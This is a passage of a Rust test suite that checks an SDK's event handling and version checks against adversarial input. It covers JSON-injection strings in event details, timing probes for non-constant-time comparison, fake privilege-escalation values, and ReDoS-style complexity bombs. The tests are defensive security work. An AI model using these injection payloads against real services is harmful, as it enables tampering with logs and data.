        let baseline_avg = timing_samples.get(&"baseline").unwrap().0;

        for (test_name, (avg, max, min)) in &timing_samples {
            if **test_name == "baseline" {
                continue;
            }

            let timing_ratio = avg / baseline_avg;

            // Complex inputs should not cause dramatically longer processing times
            assert!(
                timing_ratio < 5.0,
                "Suspicious timing difference for {}: baseline={:.0}ns, test={:.0}ns, ratio={:.2}",
                test_name,
                baseline_avg,
                avg,
                timing_ratio
            );

            // Variance within each test should be reasonable
            let variance_ratio = (max - min) / avg;
            assert!(
                variance_ratio < 3.0,
                "High timing variance for {}: avg={:.0}ns, max={:.0}ns, min={:.0}ns, variance_ratio={:.2}",
                test_name,
                avg,
                max,
                min,
                variance_ratio
            );
        }
    }

    #[test]
    fn extreme_adversarial_json_injection_via_event_detail_serialization() {
        // Extreme: JSON injection attacks through event detail serialization
        let json_injection_patterns = vec![
            // Basic JSON injection attempts
            r#"","malicious":"injected"#,
            r#""},"injected_field":"evil"#,
            r#"\":\"injected\",\"evil\":true,\"fake\":\""#,
            // Nested JSON injection
            r#"{"nested":{"injection":"attempt"}}"#,
            r#"[{"array":"injection"}]"#,
            // JSON with control characters
            "detail\",\"injected\":\"\x00\x01\x02",
            "detail\\\",\\\"injection\\\":true",
            // JSON escape sequence attacks
            "\\\"},{\\\"injected\\\":true,\\\"x\\\":\\\"",
            "\\\\\",\\\"injection\\\":1337,\\\"",
            // Unicode escape injection
            "\\u0022,\\u0022injected\\u0022:\\u0022evil\\u0022",
            // JSON payload with special characters
            "detail\"},\"injection\":true,\"comment\":\"//",
            "detail\"}/*injection*/,\"evil\":true",
        ];

        for (_i, injection_attempt) in json_injection_patterns.iter().enumerate() {
            let event = SdkEvent::new(CAPSULE_REPLAY_START, *injection_attempt);

            // Event should store injection attempt literally without interpretation
            assert_eq!(event.event_code, CAPSULE_REPLAY_START);
            assert_eq!(event.detail, *injection_attempt);

            // Simulate JSON serialization (manual since we don't have serde derives)
            let manual_json = format!(
                r#"{{"event_code":"{}","detail":"{}"}}"#,
                event.event_code,
                event.detail.replace('"', r#"\""#).replace('\\', r#"\\"#) // Basic escaping
            );

            // JSON should remain valid after escaping
            assert!(manual_json.contains("CAPSULE_REPLAY_START"));
            assert!(!manual_json.contains(r#""malicious":"injected""#));
            assert!(!manual_json.contains(r#""injected_field":"evil""#));
            assert!(!manual_json.contains(r#""injection":true"#));

            // Debug output should not contain unescaped injection
            let debug_output = format!("{:?}", event);
            assert!(!debug_output.contains(r#""malicious":"injected""#));
            assert!(!debug_output.contains(r#""injected_field""#));

            // Clone should preserve exact injection attempt
            let cloned = event.clone();
            assert_eq!(cloned.detail, *injection_attempt);
            assert_eq!(cloned.detail.len(), injection_attempt.len());
        }

        // Test version checking with JSON-like injection
        let json_version = r#"{"fake":"vsdk-v1.0","real":"evil"}"#;
        let result = check_sdk_version(json_version);
        assert!(result.is_err());

        let err = result.unwrap_err();
        assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
        assert!(!err.contains(r#""fake":"vsdk-v1.0""#)); // Shouldn't interpret as JSON
    }

    #[test]
    fn extreme_adversarial_constant_time_comparison_violation_detection() {
        // Extreme: Test for timing differences that could indicate non-constant-time string comparison
        use std::time::Instant;

        let baseline_version = "vsdk-v1.0";
        let sample_count = 1000;

        // Test versions with different "closeness" to the correct version
        let comparison_test_cases = vec![
            // Differ at different positions
            (baseline_version, "baseline"),
            ("xsdk-v1.0", "first_char_diff"), // Differs at position 0
            ("vsdk-v2.0", "version_diff"),    // Differs at position 7
            ("vsdk-v1.1", "minor_diff"),      // Differs at position 9
            ("vsdk-v1.0x", "extra_char"),     // Extra character at end
            // Different lengths but similar prefixes
            ("v", "very_short"),
            ("vsdk", "partial_match"),
            ("vsdk-v1", "almost_complete"),
            ("vsdk-v1.0.extra", "extra_long"),
            // Wrong versions with same length
            ("asdk-v1.0", "same_length_a"),
            ("bsdk-v1.0", "same_length_b"),
            ("zsdk-v1.0", "same_length_z"),
        ];

        let mut timing_results = std::collections::HashMap::new();

        for (test_version, test_name) in &comparison_test_cases {
            let mut times = Vec::new();

            for _ in 0..sample_count {
                let start = Instant::now();
                let _result = check_sdk_version(test_version);
                let duration = start.elapsed();
                times.push(duration.as_nanos());
            }

            // Calculate median time to reduce noise
            times.sort_unstable();
            let median_time = times[sample_count / 2] as f64;
            let min_time = *times.iter().min().unwrap() as f64;
            let max_time = *times.iter().max().unwrap() as f64;

            timing_results.insert(*test_name, (median_time, min_time, max_time));
        }

        // Analyze for timing attack vulnerabilities
        let times: Vec<f64> = timing_results
            .values()
            .map(|(median, _, _)| *median)
            .collect();
        let avg_time = times.iter().sum::<f64>() / times.len() as f64;
        let max_time = times.iter().fold(0.0_f64, |acc, &x| acc.max(x));
        let min_time = times.iter().fold(f64::INFINITY, |acc, &x| acc.min(x));

        // All comparisons should take similar time (constant-time comparison)
        let timing_variance_ratio = (max_time - min_time) / avg_time;

        assert!(
            timing_variance_ratio < 2.0,
            "Excessive timing variance suggests non-constant-time comparison: avg={:.0}ns, max={:.0}ns, min={:.0}ns, ratio={:.2}",
            avg_time,
            max_time,
            min_time,
            timing_variance_ratio
        );

        // No individual test case should be dramatically different
        for (test_name, (median, _min, _max)) in &timing_results {
            let individual_ratio = median / avg_time;
            assert!(
                individual_ratio < 3.0 && individual_ratio > 0.3,
                "Test case {} has suspicious timing: median={:.0}ns, avg={:.0}ns, ratio={:.2}",
                test_name,
                median,
                avg_time,
                individual_ratio
            );
        }
    }

    #[test]
    fn extreme_adversarial_cross_module_boundary_validation_with_privilege_escalation_attempts() {
        // Extreme: Test privilege escalation attempts through SDK boundary manipulation

        // Simulate attempts to bypass structural-only security posture
        let privilege_escalation_attempts = vec![
            // Direct security posture bypass attempts
            (
                "bypass_posture",
                STRUCTURAL_ONLY_SECURITY_POSTURE,
                "replacement_critical",
            ),
            (
                "modify_rule",
                STRUCTURAL_ONLY_RULE_ID,
                "PRIVILEGED_VERIFIER_ACCESS",
            ),
            // Version manipulation for privilege escalation
            ("version_escalate", SDK_VERSION, "vsdk-v2.0-privileged"),
            ("min_version_bypass", SDK_VERSION_MIN, "vsdk-v0.0-admin"),
            // Event code manipulation
            (
                "event_escalate",
                CAPSULE_CREATED,
                "PRIVILEGED_CAPSULE_CREATED",
            ),
            (
                "error_manipulate",
                ERR_CAPSULE_ACCESS_DENIED,
                "CAPSULE_ACCESS_GRANTED",
            ),
            // Invariant violation attempts
            (
                "invariant_bypass",
                INV_CAPSULE_NO_PRIVILEGED_ACCESS,
                "INV-CAPSULE-PRIVILEGED-ACCESS-ALLOWED",
            ),
        ];

        for (test_name, original_constant, malicious_value) in privilege_escalation_attempts {
            assert_ne!(original_constant, malicious_value);

            // Verify constants remain immutable and correct
            match test_name {
                "bypass_posture" => {
                    assert_eq!(
                        STRUCTURAL_ONLY_SECURITY_POSTURE,
                        "structural_only_not_replacement_critical"
                    );
                    assert_ne!(STRUCTURAL_ONLY_SECURITY_POSTURE, malicious_value);
                }
                "modify_rule" => {
                    assert_eq!(
                        STRUCTURAL_ONLY_RULE_ID,
                        "VERIFIER_SHORTCUT_GUARD::WORKSPACE_VERIFIER_SDK"
                    );
                    assert_ne!(STRUCTURAL_ONLY_RULE_ID, malicious_value);
                }
                "version_escalate" => {
                    assert_eq!(SDK_VERSION, "vsdk-v1.0");
                    assert_ne!(SDK_VERSION, malicious_value);
                }
                "min_version_bypass" => {
                    assert_eq!(SDK_VERSION_MIN, "vsdk-v1.0");
                    assert_ne!(SDK_VERSION_MIN, malicious_value);
                }
                "event_escalate" => {
                    assert_eq!(CAPSULE_CREATED, "CAPSULE_CREATED");
                    assert_ne!(CAPSULE_CREATED, malicious_value);
                }
                "error_manipulate" => {
                    assert_eq!(ERR_CAPSULE_ACCESS_DENIED, "ERR_CAPSULE_ACCESS_DENIED");
                    assert_ne!(ERR_CAPSULE_ACCESS_DENIED, malicious_value);
                }
                "invariant_bypass" => {
                    assert_eq!(
                        INV_CAPSULE_NO_PRIVILEGED_ACCESS,
                        "INV-CAPSULE-NO-PRIVILEGED-ACCESS"
                    );
                    assert_ne!(INV_CAPSULE_NO_PRIVILEGED_ACCESS, malicious_value);
                }
                _ => {}
            }

            // Test creating events with manipulated codes (should use constants, not variables)
            let event_with_malicious = SdkEvent::new(CAPSULE_CREATED, malicious_value);
            assert_eq!(event_with_malicious.event_code, CAPSULE_CREATED); // Should use constant
            assert_eq!(event_with_malicious.detail, malicious_value); // Detail can contain anything

            // Verify version checking rejects privilege escalation versions
            if malicious_value.starts_with("vsdk-v") {
                let version_result = check_sdk_version(malicious_value);
                assert!(
                    version_result.is_err(),
                    "Privileged version should be rejected: {}",
                    malicious_value
                );

                let err = version_result.unwrap_err();
                assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
                assert!(!err.contains("privileged"));
                assert!(!err.contains("admin"));
            }
        }

        // Verify security posture constraints remain enforced
        assert!(STRUCTURAL_ONLY_SECURITY_POSTURE.contains("structural_only"));
        assert!(STRUCTURAL_ONLY_SECURITY_POSTURE.contains("not_replacement_critical"));
        assert!(STRUCTURAL_ONLY_RULE_ID.contains("VERIFIER_SHORTCUT_GUARD"));

        // Test that SDK maintains proper security boundaries
        let privileged_event =
            SdkEvent::new(ERR_CAPSULE_ACCESS_DENIED, "attempted_privilege_escalation");
        assert_eq!(privileged_event.event_code, ERR_CAPSULE_ACCESS_DENIED);
        assert!(
            privileged_event
                .detail
                .contains("attempted_privilege_escalation")
        );

        // Verify invariants remain true
        assert!(INV_CAPSULE_NO_PRIVILEGED_ACCESS.contains("NO-PRIVILEGED-ACCESS"));
        assert!(INV_CAPSULE_VERDICT_REPRODUCIBLE.contains("VERDICT-REPRODUCIBLE"));
        assert!(INV_CAPSULE_STABLE_SCHEMA.contains("STABLE-SCHEMA"));
        assert!(INV_CAPSULE_VERSIONED_API.contains("VERSIONED-API"));
    }

    #[test]
    fn extreme_adversarial_algorithmic_complexity_explosion_via_pathological_event_patterns() {
        // Extreme: Test algorithmic complexity attacks through pathological event patterns

        let complexity_bomb_patterns = vec![
            // Exponential pattern matching worst cases
            ("a".repeat(1000) + "b", "linear_with_mismatch"),
            // Nested parentheses (potential ReDoS patterns)
            ("(".repeat(500) + &")".repeat(500), "balanced_parens"),
            ("(".repeat(1000), "unbalanced_open"),
            (")".repeat(1000), "unbalanced_close"),
            // Alternating patterns that stress string algorithms
            ("ab".repeat(5000), "alternating_short"),
            ("abc".repeat(3333), "alternating_triplet"),
            // Unicode normalization complexity bombs
            ("e\u{0301}".repeat(1000), "combining_accents"), // é repeated
            ("\u{0300}".repeat(2000), "combining_only"),     // Combining chars only
            // Pattern that could trigger quadratic behavior in naive algorithms
            (
                "x".repeat(100) + "y" + &"x".repeat(100),
                "embedded_mismatch",
            ),
            // Deeply nested structure patterns
            (
                format!("{}{}{}", "[".repeat(100), "data", "]".repeat(100)),
                "nested_brackets",
            ),
            (
                format!("{}{}{}", "{".repeat(200), "json", "}".repeat(200)),
                "nested_braces",
            ),
        ];

        for (pathological_detail, test_name) in complexity_bomb_patterns {
            let start_time = std::time::Instant::now();

            // Event creation should complete quickly despite pathological input
            let event = SdkEvent::new(CAPSULE_SIGNED, pathological_detail.clone());
            let creation_time = start_time.elapsed();

            assert!(
                creation_time < std::time::Duration::from_millis(50),
                "Event creation too slow for {}: {:?}",
                test_name,
                creation_time
            );

            assert_eq!(event.event_code, CAPSULE_SIGNED);
            assert_eq!(event.detail, pathological_detail);
            assert_eq!(event.detail.len(), pathological_detail.len());

            // Cloning should also be fast
            let clone_start = std::time::Instant::now();
            let cloned = event.clone();
            let clone_time = clone_start.elapsed();

            assert!(
                clone_time < std::time::Duration::from_millis(20),
                "Event cloning too slow for {}: {:?}",
                test_name,
                clone_time
            );
            assert_eq!(cloned.detail, event.detail);

            // Debug formatting should be bounded
            let debug_start = std::time::Instant::now();
            let debug_output = format!("{:?}", event);
            let debug_time = debug_start.elapsed();

            assert!(
                debug_time < std::time::Duration::from_millis(100),
                "Debug formatting too slow for {}: {:?}",
                test_name,
                debug_time
            );
            assert!(debug_output.contains("CAPSULE_SIGNED"));

            // Memory usage should be proportional to input size, not exponential
            let estimated_memory = pathological_detail.len() * std::mem::size_of::<char>() * 3; // Some overhead
            assert!(
                estimated_memory < 50_000_000, // 50MB limit
                "Estimated memory usage too high for {}: {} bytes",
                test_name,
                estimated_memory
            );
        }

        // Test batched processing of pathological patterns
        let batch_start = std::time::Instant::now();
        let mut batch_events = Vec::new();

        for i in 0..100 {
            let complex_detail = format!("batch_{}_{}", i, "x".repeat(i * 10));
            let event = SdkEvent::new(CAPSULE_VERDICT_REPRODUCED, complex_detail);
            batch_events.push(event);
        }

        let batch_time = batch_start.elapsed();
        assert!(
            batch_time < std::time::Duration::from_millis(500),
            "Batch processing too slow: {:?}",
            batch_time
        );

        // Verify all batch events are correct
        for (i, event) in batch_events.iter().enumerate() {
            assert_eq!(event.event_code, CAPSULE_VERDICT_REPRODUCED);
            assert!(event.detail.contains(&format!("batch_{}", i)));
        }
    }
}
